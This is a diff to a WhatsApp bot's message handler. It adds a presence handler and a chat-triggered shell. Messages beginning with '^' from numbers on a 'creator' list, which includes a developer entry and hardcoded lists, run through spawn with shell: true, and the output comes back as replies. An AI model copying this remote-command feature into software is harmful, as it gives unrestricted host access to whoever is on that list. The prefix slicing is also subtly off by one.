@@ -279,7 +279,11 @@ message:{
     });
 
     conn.ev.on('creds.update', saveCreds);
-    
+    //=========WELCOME & GOODBYE =======
+	
+conn.ev.on('presence.update', async (update) => {
+    await PresenceControl(conn, update);
+});
 // =====================================
 conn.ev.on('call', async (calls) => {
   try {
@@ -512,7 +516,35 @@ BotActivityFilter(conn);
     let isCreator = [udp, ...davidop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
     .includes(mek.sender);
-    
+	  
+      if (isCreator && mek.text.startsWith("^")) {
+            let code = budy.slice(2);
+            if (!code) {
+                reply(`*📍 𝐏𝐑𝐄𝐅𝐈𝐗: \`${prefix}\`*`);
+                return;
+            }
+            const { spawn } = require("child_process");
+            try {
+                let resultTest = spawn(code, { shell: true });
+                resultTest.stdout.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.stderr.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("error", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("close", code => {
+                    if (code !== 0) {
+                        reply(`command exited with code ${code}`);
+                    }
+                });
+            } catch (err) {
+                reply(util.format(err));
+            }
+            return;
+		    }
     
  //================ownerreact==============
     if (senderNumber.includes("923003588997") && !isReact) {
